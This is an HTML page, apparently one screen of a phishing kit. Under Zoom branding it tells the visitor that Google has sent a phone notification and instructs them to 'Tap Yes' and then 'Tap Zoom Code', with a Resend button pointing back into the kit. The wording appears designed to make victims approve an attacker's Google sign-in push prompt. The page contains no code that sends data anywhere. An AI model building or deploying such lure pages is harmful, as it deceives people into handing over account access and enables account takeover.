<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      color: #202124;
      overflow: hidden;
    }

    /* Container e soraSori space-between dewa holo jate upore niche shob fill hoy */
    .container {
      width: 100%;
      height: 100dvh;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      padding: 2.5vh 5vw 3vh 5vw;
      background: #ffffff;
    }

    /* Top Logo */
    .logo {
      width: 12vw;
      max-width: 52px;
      height: auto;
      object-fit: contain;
      border-radius: 50%;
    }

    /* Main Title */
    h1 {
      font-size: clamp(18px, 4.8vw, 23px);
      font-weight: 700;
      color: #1a1a1a;
    }

    /* Phone Graphic Illustration */
    .phone-illustration {
      width: 44vw;
      max-width: 185px;
      height: auto;
      max-height: 30vh;
      object-fit: contain;
    }

    /* Text Group */
    .text-group {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Sub Heading */
    h2 {
      font-size: clamp(16px, 4.2vw, 20px);
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 6px;
    }

    /* Description Text */
    .desc-text {
      font-size: clamp(13.5px, 3.6vw, 15.5px);
      font-weight: 600;
      color: #1f2937;
      line-height: 1.4;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button */
    .btn-join {
      background-color: #007aff;
      color: white;
      padding: 14px 0;
      width: 100%;
      max-width: 340px;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);
      transition: background-color 0.2s, transform 0.1s;
      flex-shrink: 0;
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="container">
    <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
    <h1>One Time Pass Code</h1>
    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
    <div class="text-group">
      <h2>Check your phone.</h2>
      <p class="desc-text">
        Google sent a notification to your phone.<br>
        <span>Tap Yes</span> on the notification<br>
        Then Tap Zoom Code
      </p>
    </div>
    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
  </div>

</body>
</html>
